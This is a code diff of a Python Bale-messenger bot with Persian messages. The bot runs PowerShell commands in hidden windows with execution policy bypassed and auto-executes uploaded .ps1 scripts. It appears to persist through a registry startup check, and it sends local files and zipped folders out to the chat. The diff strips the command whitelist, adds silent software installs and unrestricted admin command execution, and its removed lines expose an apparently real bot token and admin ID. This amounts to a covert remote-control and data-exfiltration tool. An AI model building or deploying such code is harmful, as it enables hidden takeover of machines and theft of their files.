@@ -5,28 +5,23 @@ import uuid
 import os
 import time
 import json
+import zipfile
 from urllib.parse import urljoin
 
-# تنظیمات اولیه
-TOKEN = os.getenv('BOT_TOKEN', '409735383:GOAYZsEHaxLZk4UktrtMfZjg67DXfs75wQGaeiLL')  # توکن ربات
+# Initial settings
+TOKEN = ('BOT_Token')  # Bot token
 API_URL = f'https://tapi.bale.ai/bot{TOKEN}/'
-# لیست سفید دستورات مجاز
-ALLOWED_COMMANDS = [
-    'dir', 'ls', 'cd', 'pwd', 'echo', 'whoami', 'ipconfig', 'netstat',
-    'get-process', 'get-service', 'get-disk', 'get-counter', 'get-childitem',
-    'get-item', 'set-location', 'get-acl', 'get-date', 'get-host', 'get-psdrive',
-    'remove-item', 'rm', 'copy-Item', 'rename-item', 'move-item'  # اضافه شده
-]
-DANGEROUS_COMMANDS = ['remove-item']  # دستورات خطرناک
-DOWNLOAD_DIR = os.path.join(os.path.expanduser('~'), 'bot_downloads')  # دایرکتوری پیش‌فرض
-ADMIN_CHAT_IDS = {1315674867}  # chat_id ادمین‌ها (جایگزین کنید)
+DOWNLOAD_DIR = os.path.join(os.path.expanduser('~'), 'bot_downloads')  # Default directory
+ADMIN_CHAT_IDS = {123457890}  # Admin chat IDs (replace with your own)
 is_system_command = False
 is_waiting_for_dir = False
+is_waiting_for_zip_choice = False
 current_chat_id = None
 current_directory = os.getcwd()
 pending_download_dir = None
+pending_zip_choice = None
 
-# ایجاد دایرکتوری پیش‌فرض
+# Create default directory
 if not os.path.exists(DOWNLOAD_DIR):
     os.makedirs(DOWNLOAD_DIR)
 
@@ -61,7 +56,29 @@ def send_file(chat_id, file_path):
         send_message(chat_id, f"خطا در ارسال فایل: {e}")
         return None
 
-def download_file(file_id, file_name, target_dir):
+def zip_folder(folder_path, output_path):
+    try:
+        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, _, files in os.walk(folder_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, folder_path)
+                    zipf.write(file_path, arcname)
+        return output_path
+    except Exception as e:
+        print(f"خطا در فشرده‌سازی: ⛔ {e}")
+        return None
+
+def unzip_file(zip_path, extract_dir):
+    try:
+        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+            zip_ref.extractall(extract_dir)
+        return True
+    except Exception as e:
+        print(f"خطا در استخراج فایل زیپ: ⛔ {e}")
+        return False
+
+def download_file(file_id, file_name, target_dir, unzip=False):
     try:
         url = urljoin(API_URL, 'getFile')
         response = requests.get(url, params={'file_id': file_id}, timeout=10)
@@ -83,6 +100,13 @@ def download_file(file_id, file_name, target_dir):
         response.raise_for_status()
         with open(download_path, 'wb') as f:
             f.write(response.content)
+        
+        if unzip and download_path.endswith('.zip'):
+            if unzip_file(download_path, target_dir):
+                os.remove(download_path)
+                return f"فایل زیپ با موفقیت استخراج شد در: {target_dir}"
+            else:
+                return f"خطا در استخراج فایل زیپ"
         return download_path
     except (requests.RequestException, IOError, OSError) as e:
         print(f"خطا در دانلود فایل: ⛔ {e}")
@@ -106,21 +130,31 @@ def run_powershell_command_hidden(command, is_admin=False):
                 return f"تغییر دایرکتوری به: {current_directory}"
             return "خطا: دایرکتوری یافت نشد 🚫"
 
-        command_name = command.split()[0].lower()
-        if command_name not in ALLOWED_COMMANDS:
-            return (
-                f"خطا: دستور '{command_name}' مجاز نیست. 🚫\n"
-                f"دستورات مجاز: {', '.join(ALLOWED_COMMANDS)}\n"
-                f"برای دستورات پیشرفته، با ادمین تماس بگیرید."
+        # Install programs with Chocolatey or Winget
+        if command.startswith('install '):
+            program = command[8:].strip()
+            # Try Winget first
+            winget_command = f"winget install --id {program} -e --silent --accept-package-agreements --accept-source-agreements"
+            result = subprocess.run(
+                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', winget_command],
+                capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
             )
+            if result.returncode == 0:
+                return f"برنامه {program} با winget نصب شد ✅"
+            # Try Chocolatey if Winget fails
+            choco_command = f"choco install {program} -y"
+            result = subprocess.run(
+                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', choco_command],
+                capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
+            )
+            if result.returncode == 0:
+                return f"برنامه {program} با Chocolatey نصب شد ✅"
+            return f"خطا در نصب برنامه: ⛔ {result.stderr.strip()}"
 
-        if command_name in DANGEROUS_COMMANDS:
-            if not is_admin:
-                return "خطا: فقط ادمین‌ها می‌توانند دستورات خطرناک مانند 'remove-item' را اجرا کنند. 🚫"
-            command += ' -Force -Recurse -Confirm:$false'  # اضافه کردن Recurse برای حذف کامل
-            send_message(current_chat_id, "⚠️ هشدار: شما در حال اجرای یک دستور خطرناک هستید که ممکن است فایل‌ها یا دایرکتوری‌ها را حذف کند!")
+        # No restrictions on commands for admins
+        if not is_admin:
+            return "خطا: فقط ادمین‌ها می‌توانند دستورات را اجرا کنند 🚫"
 
-        # غیرفعال کردن تأیید در جلسه PowerShell
         combined_command = f"$ConfirmPreference='None'; Set-Location -Path '{current_directory}'; {command}"
         result = subprocess.run(
             ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', combined_command],
@@ -139,23 +173,12 @@ def run_powershell_script(file_path, is_admin=False):
             return "خطا: فقط فایل‌های .ps1 مجاز هستند. 🚫"
         
         if not is_admin:
-            with open(file_path, 'r', encoding='utf-8') as f:
-                script_content = f.read().lower()
-                for cmd in ALLOWED_COMMANDS:
-                    if cmd in script_content:
-                        break
-                else:
-                    return (
-                        f"خطا: اسکریپت شامل دستورات غیرمجاز است. 🚫\n"
-                        f"دستورات مجاز: {', '.join(ALLOWED_COMMANDS)}"
-                    )
+            return "خطا: فقط ادمین‌ها می‌توانند اسکریپت‌ها را اجرا کنند. 🚫"
 
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
         command = f"$ConfirmPreference='None'; Set-Location -Path '{current_directory}'; & '{file_path}'"
-        if is_admin:
-            command += ' -Force -Recurse -Confirm:$false'
         result = subprocess.run(
             ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', command],
             capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
@@ -201,7 +224,7 @@ def check_and_add_to_startup():
         print(f"خطا در بررسی رجیستری: ⛔ {e}")
 
 def handle_update(update):
-    global is_system_command, is_waiting_for_dir, current_chat_id, pending_download_dir
+    global is_system_command, is_waiting_for_dir, is_waiting_for_zip_choice, current_chat_id, pending_download_dir, pending_zip_choice
     message = update.get('message')
     if not message:
         return
@@ -211,11 +234,26 @@ def handle_update(update):
     document = message.get('document')
     is_admin = current_chat_id in ADMIN_CHAT_IDS
 
+    if not is_admin:
+        send_message(current_chat_id, "خطا: فقط ادمین‌ها می‌توانند از این ربات استفاده کنند 🚫")
+        return
+
     default_keyboard = {
         'keyboard': [
             [{'text': 'اجرای دستورات پاورشل 👨‍💻'}],
             [{'text': 'ارسال فایل 📤'}],
-            [{'text': 'دریافت فایل 📥'}]
+            [{'text': 'دریافت فایل 📥'}],
+            [{'text': 'ارسال پوشه (فشرده) 📁'}]
+        ],
+        'resize_keyboard': True,
+        'one_time_keyboard': True
+    }
+
+    zip_choice_keyboard = {
+        'keyboard': [
+            [{'text': 'فشرده (ZIP) 📦'}],
+            [{'text': 'بدون فشرده‌سازی 📂'}],
+            [{'text': 'پایان عملیات 🔚'}]
         ],
         'resize_keyboard': True,
         'one_time_keyboard': True
@@ -226,25 +264,49 @@ def handle_update(update):
         send_message(current_chat_id, "یکی از گزینه‌های زیر رو انتخاب کن: 👇", reply_markup=default_keyboard)
 
     elif text == 'اجرای دستورات پاورشل 👨‍💻':
-        send_message(current_chat_id, "دستور پاورشل خودت رو وارد کن. (دستورات پیشرفته فقط برای ادمین‌ها)")
+        send_message(current_chat_id, "دستور پاورشل خودت رو وارد کن (همه دستورات برای ادمین مجاز هستند)")
         is_system_command = True
         is_waiting_for_dir = False
+        is_waiting_for_zip_choice = False
 
     elif text == 'دریافت فایل 📥':
         send_message(current_chat_id, "مسیر فایل رو توی سیستم وارد کن (مثل: C:\\file.txt).")
         is_system_command = False
         is_waiting_for_dir = False
+        is_waiting_for_zip_choice = False
 
     elif text == 'ارسال فایل 📤':
         send_message(current_chat_id, "مسیر دایرکتوری مقصد رو وارد کن (مثل: C:\\Users\\YourName\\Downloads).")
         is_system_command = False
         is_waiting_for_dir = True
+        is_waiting_for_zip_choice = False
+
+    elif text == 'ارسال پوشه (فشرده) 📁':
+        send_message(current_chat_id, "مسیر پوشه رو وارد کن (مثل: C:\\Users\\YourName\\MyFolder).")
+        is_system_command = False
+        is_waiting_for_dir = True
+        is_waiting_for_zip_choice = False
+        pending_zip_choice = True
+
+    elif text == 'فشرده (ZIP) 📦':
+        if is_waiting_for_zip_choice:
+            pending_zip_choice = True
+            send_message(current_chat_id, "حالا فایل یا پوشه رو آپلود کن.")
+            is_waiting_for_zip_choice = False
+
+    elif text == 'بدون فشرده‌سازی 📂':
+        if is_waiting_for_zip_choice:
+            pending_zip_choice = False
+            send_message(current_chat_id, "حالا فایل یا پوشه رو آپلود کن.")
+            is_waiting_for_zip_choice = False
 
     elif text == 'پایان عملیات 🔚':
         send_message(current_chat_id, "عملیات تموم شد! 🔚")
         is_system_command = False
         is_waiting_for_dir = False
+        is_waiting_for_zip_choice = False
         pending_download_dir = None
+        pending_zip_choice = None
         send_message(current_chat_id, "برای ادامه، یکی از گزینه‌ها رو انتخاب کن: 👇", reply_markup=default_keyboard)
 
     else:
@@ -258,16 +320,34 @@ def handle_update(update):
             })
         elif is_waiting_for_dir and not document:
             target_dir = text.strip()
-            if os.path.isdir(target_dir) and os.access(target_dir, os.W_OK):
+            if pending_zip_choice and not os.path.isdir(target_dir):
+                send_message(current_chat_id, "خطا: مسیر باید یک پوشه باشد برای ارسال فشرده 📁")
+            elif os.path.exists(target_dir) and os.access(target_dir, os.W_OK):
                 pending_download_dir = target_dir
-                send_message(current_chat_id, f"دایرکتوری مقصد تنظیم شد: {target_dir}\nحالا فایلت رو آپلود کن.")
+                if pending_zip_choice:
+                    temp_zip = os.path.join(os.path.dirname(target_dir), f"{os.path.basename(target_dir)}.zip")
+                    zipped = zip_folder(target_dir, temp_zip)
+                    if zipped:
+                        send_file(current_chat_id, zipped)
+                        send_message(current_chat_id, f"پوشه فشرده با موفقیت ارسال شد 📁")
+                        os.remove(temp_zip)
+                    else:
+                        send_message(current_chat_id, "خطا در فشرده‌سازی پوشه 🚫")
+                    pending_download_dir = None
+                    is_waiting_for_dir = False
+                    pending_zip_choice = None
+                else:
+                    send_message(current_chat_id, "آیا فایل/پوشه را فشرده دریافت کنم؟", reply_markup=zip_choice_keyboard)
+                    is_waiting_for_dir = False
+                    is_waiting_for_zip_choice = True
             else:
-                send_message(current_chat_id, "خطا: دایرکتوری نامعتبره یا دسترسی نوشتن نداری. 🚫\nیه مسیر دیگه وارد کن.")
+                send_message(current_chat_id, "خطا: مسیر نامعتبره یا دسترسی نوشتن نداری. 🚫\nیه مسیر دیگه وارد کن.")
         elif document:
             file_id = document.get('file_id')
             file_name = document.get('file_name', 'unknown_file')
             target_dir = pending_download_dir if pending_download_dir else DOWNLOAD_DIR
-            downloaded_path = download_file(file_id, file_name, target_dir)
+            unzip = pending_zip_choice if pending_zip_choice is not None else False
+            downloaded_path = download_file(file_id, file_name, target_dir, unzip)
             if downloaded_path:
                 if file_name.endswith('.ps1'):
                     send_message(current_chat_id, "فایل پاورشل دریافت شد. در حال اجرا... 🚀")
@@ -277,6 +357,8 @@ def handle_update(update):
                     send_message(current_chat_id, f"فایل با موفقیت دانلود شد 📥: {downloaded_path}")
                 pending_download_dir = None
                 is_waiting_for_dir = False
+                is_waiting_for_zip_choice = False
+                pending_zip_choice = None
             else:
                 send_message(current_chat_id, "خطا در دانلود فایل. 🚫")
             send_message(current_chat_id, "برای ادامه، یکی از گزینه‌ها رو انتخاب کن: 👇", reply_markup=default_keyboard)
@@ -309,7 +391,7 @@ def main():
         for update in updates.get('result', []):
             handle_update(update)
             last_update_id = update['update_id'] + 1
-        time.sleep(1)  # جلوگیری از درخواست‌های زیاد
+        time.sleep(1)  # Prevent excessive requests
 
 if __name__ == '__main__':
     main()
